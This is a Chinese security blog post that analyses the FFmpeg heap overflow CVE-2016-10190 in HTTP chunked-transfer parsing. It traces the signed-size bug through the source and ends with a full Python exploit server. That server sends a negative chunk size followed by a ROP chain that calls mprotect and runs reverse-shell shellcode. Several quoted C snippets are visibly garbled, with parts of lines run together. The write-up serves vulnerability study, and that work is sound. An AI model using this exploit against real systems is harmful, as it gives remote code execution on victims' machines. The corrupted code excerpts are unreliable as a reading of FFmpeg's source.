@@ -1,0 +1,259 @@
+作者：[bird@tsrc](https://security.tencent.com/index.php/blog/msg/116)
+## 1\. 前言
+FFmpeg是一个著名的处理音视频的开源项目，使用者众多。2016年末paulcher发现FFmpeg三个堆溢出漏洞分别为CVE-2016-10190、CVE-2016-10191以及CVE-2016-10192。本文详细分析了CVE-2016-10190，是二进制安全入门学习堆溢出一个不错的案例。
+调试环境：
+  1. FFmpeg版本：3.2.1按照编译
+  2. 操作系统：Ubuntu 16.04 x64
+## 2\. 漏洞分析
+此漏洞是发生在处理`HTTP`流时，读取`HTTP`流的过程大概如下：
+  1. `avformat_open_input`函数初始化输入文件的主要信息，其中与漏洞有关的是创建`AVIOContext`结构体
+  2. 如果输入文件是`HTTP`流则调用`http_open`函数发起请求
+  3. 调用`http_read_header`函数解析响应数据的头信息
+  4. 解析完后调用`avio_read`->`io_read_packet`->`http_read`->`http_read_stream`函数读取之后的数据
+首先看下`http_read_stream`函数
+    static int http_read_stream(URLContext *h, uint8_t *buf, int size)
+    {
+        HTTPContext *s = h->priv_data;
+        int err, new_location, read_ret;
+        int64_t seek_ret;
+        ...
+        if (s->chunksize >= 0) {
+            if (!s->chunksize) {
+                char line[32];
+                    do {
+                        if ((err = http_get_line(s, line, sizeof(line))) chunksize = strtoll(line, NULL, 16);
+                    av_log(NULL, AV_LOG_TRACE, "Chunked encoding data size: %"PRId64"'\n",
+                            s->chunksize);
+                    if (!s->chunksize)
+                        return 0;
+            }
+            size = FFMIN(size, s->chunksize);
+        }
+        ...
+        read_ret = http_buf_read(h, buf, size);
+        ...
+        return read_ret;
+    }
+上面`s->chunksize = strtoll(line, NULL,
+16)`这一行代码是读取chunk的大小，这里调用`strtoll`函数返回一个有符号数，再看`HTTPContext`结构体
+    typedef struct HTTPContext {
+        const AVClass *class;
+        URLContext *hd;
+        unsigned char buffer[BUFFER_SIZE], *buf_ptr, *buf_end;
+        int line_count;
+        int http_code;
+        /* Used if "Transfer-Encoding: chunked" otherwise -1. */
+        int64_t chunksize;
+        ...
+    } HTTPContext;
+可以看到`chunksize`为`int64_t`类型也是有符号数，当执行`size = FFMIN(size,
+s->chunksize)`这行代码时，由于传进来的`size=0x8000`，如果之前的`strtoll`函数返回一个负数，这样就会导致`size =
+s->chunksize`也为一个负数，之后执行到`read_ret = http_buf_read(h, buf,
+size)`，看下`http_buf_read`函数
+    static int http_buf_read(URLContext *h, uint8_t *buf, int size)
+    {
+        HTTPContext *s = h->priv_data;
+        int len;
+        /* read bytes from input buffer first */
+        len = s->buf_end - s->buf_ptr;
+        if (len > 0) {
+            if (len > size)
+                len = size;
+            memcpy(buf, s->buf_ptr, len);
+            s->buf_ptr += len;
+        } else {
+            int64_t target_end = s->end_off ? s->end_off : s->filesize;
+            if ((!s->willclose || s->chunksize = 0 && s->off >= target_end)
+                return AVERROR_EOF;
+            len = ffurl_read(s->hd, buf, size);
+            ...
+        }
+        ...
+        return len;
+    }
+上面代码`else`分支执行到`len = ffurl_read(s->hd, buf,
+size)`，而`ffurl_read`中又会调用`tcp_read`函数(函数指针的方式)来读取之后真正的数据，最后看`tcp_read`函数
+    static int tcp_read(URLContext *h, uint8_t *buf, int size)
+    {
+        TCPContext *s = h->priv_data;
+        int ret;
+        if (!(h->flags & AVIO_FLAG_NONBLOCK)) {
+            ret = ff_network_wait_fd_timeout(s->fd, 0, h->rw_timeout, &h->interrupt_callback);
+            if (ret)
+                return ret;
+        }
+        ret = recv(s->fd, buf, size, 0);
+        return ret fd, buf, size,
+0)`时，如果`size`为负数，`recv`函数会把`size`转换成无符号数变成一个很大的正数，而`buf`指向的又是堆上的空间，这样就可能导致堆溢出，如果溢出覆盖一个函数指针就可能导致远程代码执行。
+## 3\. 漏洞利用
+在`http_read_stream`函数里想要执行`s->chunksize = strtoll(line, NULL,
+16)`需要`s->chunksize >=
+0`，看下发送请求后`http_read_header`函数中解析响应数据里每个请求头的函数`process_line`
+    static int process_line(URLContext *h, char *line, int line_count,
+                            int *new_location)
+    {
+        HTTPContext *s = h->priv_data;
+        const char *auto_method =  h->flags & AVIO_FLAG_READ ? "POST" : "GET";
+        char *tag, *p, *end, *method, *resource, *version;
+        int ret;
+        /* end of header */
+        if (line[0] == '\0') {
+            s->end_header = 1;
+            return 0;
+        }
+        p = line;
+        if (line_count == 0) {
+            ...
+        } else {
+            while (*p != '\0' && *p != ':')
+                p++;
+            if (*p != ':')
+                return 1;
+            *p  = '\0';
+            tag = line;
+            p++;
+            while (av_isspace(*p))
+                p++;
+            if (!av_strcasecmp(tag, "Location")) {
+                if ((ret = parse_location(s, p)) filesize == -1) {
+                s->filesize = strtoll(p, NULL, 10);
+            } else if (!av_strcasecmp(tag, "Content-Range")) {
+                parse_content_range(h, p);
+            } else if (!av_strcasecmp(tag, "Accept-Ranges") &&
+                       !strncmp(p, "bytes", 5) &&
+                       s->seekable == -1) {
+                h->is_streamed = 0;
+            } else if (!av_strcasecmp(tag, "Transfer-Encoding") &&
+                       !av_strncasecmp(p, "chunked", 7)) {
+                s->filesize  = -1;
+                s->chunksize = 0;
+            }
+            ...
+        }
+        return 1;
+    }
+可以看到当请求头中包含`Transfer-Encoding:
+chunked`时会把`s->filesize`赋值`-1`、`s->chunksize`赋值`0`。
+下面看下漏洞利用的整个调试过程，先发送包含`Transfer-Encoding:
+chunked`的请求头，然后`avio_read`函数中会循环调用`s->read_packet`指向的函数指针`io_read_packet`读取请求头之后的数据
+同时看下`AVIOContext`结构体参数
+之后来到`http_read_stream`函数
+可以看到`s->chunksize == 0`，这时服务器发送chunk的大小为`-1`，然后就会执行`s->chunksize =
+strtoll(line, NULL, 16)`把`s->chunksize`赋值为`-1`，并在执行`size = FFMIN(size,
+s->chunksize)`后把`size`赋值为`-1`，之后来到`http_buf_read`函数
+这里`len == 0`会转而执行`else`分支，又由于`s->end_off == 0 && s->filesize ==
+-1`，这样就会执行到`len = ffurl_read(s->hd, buf,
+size)`，`ffurl_read`中会调用`tcp_read`函数执行到`ret = recv(s->fd, buf, size, 0)`
+可以看到`buf`的地址是`0x229fd20`，而之前的`AVIOContext`的地址为`0x22a7d80`，因此buf在读入`0x22a7d80 -0x229fd20 = 0x8060`字节后就可以溢出到`AVIOContext`结构体，这里溢出覆盖它的`read_packet`函数指针
+这样在`avio_read`函数中循环进行下一次读取的时候就控制了PC
+最后利用成功反弹shell的演示
+## 4\. 完整EXP
+根据修改
+    #!/usr/bin/python
+    import os
+    import sys
+    import socket
+    from time import sleep
+    from pwn import *
+    bind_ip = '0.0.0.0'
+    bind_port = 12345
+    headers = """HTTP/1.1 200 OK
+    Server: HTTPd/0.9
+    Date: Sun, 10 Apr 2005 20:26:47 GMT
+    Content-Type: text/html
+    Transfer-Encoding: chunked
+    """
+    elf = ELF('/home/bird/ffmpeg_sources/FFmpeg-n3.2.1/ffmpeg')
+    shellcode_location = 0x1b28000 # require writeable -> data or bss segment...
+    page_size = 0x1000
+    rwx_mode = 7
+    gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))
+    pop_rdi = gadget('pop rdi; ret')
+    log.info("pop_rdi:%#x" % pop_rdi)
+    pop_rsi = gadget('pop rsi; ret')
+    log.info("pop_rsi:%#x" % pop_rsi)
+    pop_rax = gadget('pop rax; ret')
+    log.info("pop_rax:%#x" % pop_rax)
+    pop_rcx = gadget('pop rcx; ret')
+    log.info("pop_rcx:%#x" % pop_rcx)
+    pop_rdx = gadget('pop rdx; ret')
+    log.info("pop_rdx:%#x" % pop_rdx)
+    pop_rbp = gadget('pop rbp; ret')
+    log.info("pop_rbp:%#x" % pop_rbp)
+    push_rbx = gadget('push rbx; jmp rdi')
+    log.info("push_rbx:%#x" % push_rbx)
+    pop_rsp = gadget('pop rsp; ret')
+    log.info("pop_rsp:%#x" % pop_rsp)
+    add_rsp = gadget('add rsp, 0x58')
+    mov_gadget = gadget('mov qword ptr [rcx], rax ; ret')
+    log.info("mov_gadget:%#x" % mov_gadget)
+    mprotect_func = elf.plt['mprotect']
+    log.info("mprotect_func:%#x" % mprotect_func)
+    read_func = elf.plt['read']
+    log.info("read_func:%#x" % read_func)
+    def handle_request(client_socket):
+        request = client_socket.recv(2048)
+        print request
+        payload = ''
+        payload += 'C' * (0x8060)
+        payload += p64(0x004a9929) # rop starts here -> add rsp, 0x58 ; ret
+        payload += 'CCCCCCCC' * 4
+        payload += p64(0x0040b839) # rdi -> pop rsp ; ret
+        payload += p64(0x015e1df5) # call *%rax -> push rbx ; jmp rdi
+        payload += 'BBBBBBBB' * 3
+        payload += 'AAAA'
+        payload += p32(0)
+        payload += 'AAAAAAAA'
+        payload += p64(0x004a9929) # second add_esp rop to jump to uncorrupted chunk -> add rsp, 0x58 ; ret
+        payload += 'XXXXXXXX' * 11
+        # real rop payload starts here
+        #
+        # using mprotect to create executable area
+        payload += p64(pop_rdi)
+        payload += p64(shellcode_location)
+        payload += p64(pop_rsi)
+        payload += p64(page_size)
+        payload += p64(pop_rdx)
+        payload += p64(rwx_mode)
+        payload += p64(mprotect_func)
+        # backconnect shellcode x86_64: 127.0.0.1:31337
+        shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
+        shellcode = '\x90' * (8 - (len(shellcode) % 8)) + shellcode
+        shellslices = map(''.join, zip(*[iter(shellcode)]*8))
+        write_location = shellcode_location - 8
+        for shellslice in shellslices:
+            payload += p64(pop_rax)
+            payload += shellslice
+            payload += p64(pop_rcx)
+            payload += p64(write_location)
+            payload += p64(mov_gadget)
+            write_location += 8
+        payload += p64(pop_rbp)
+        payload += p64(4)
+        payload += p64(shellcode_location)
+        client_socket.send(headers)
+        client_socket.send('-1\n')
+        sleep(5)
+        client_socket.send(payload)
+        client_socket.close()
+    if __name__ == '__main__':
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((bind_ip, bind_port))
+        s.listen(5)
+        filename = os.path.basename(__file__)
+        st = os.stat(filename)
+        while True:
+            client_socket, addr = s.accept()
+            handle_request(client_socket)
+            if os.stat(filename) != st:
+                print 'restarted'
+                sys.exit(0)
+## 5\. 总结
+此漏洞主要是由于没有正确定义有无符号数的类型导致覆盖函数指针来控制PC，微软在Windows 10中加入了CFG(Control Flow
+Guard)正是来缓解这种类型的攻击，此漏洞已在中修复。另外对于静态编译的版本，ROP
+gadget较多，相对好利用，对于动态链接的版本，此漏洞在`libavformat.so`中，找到合适的gadget会有一定难度，但并非没有利用的可能。
+# 6\. 参考
+  1. 
+  2. 
+* * *
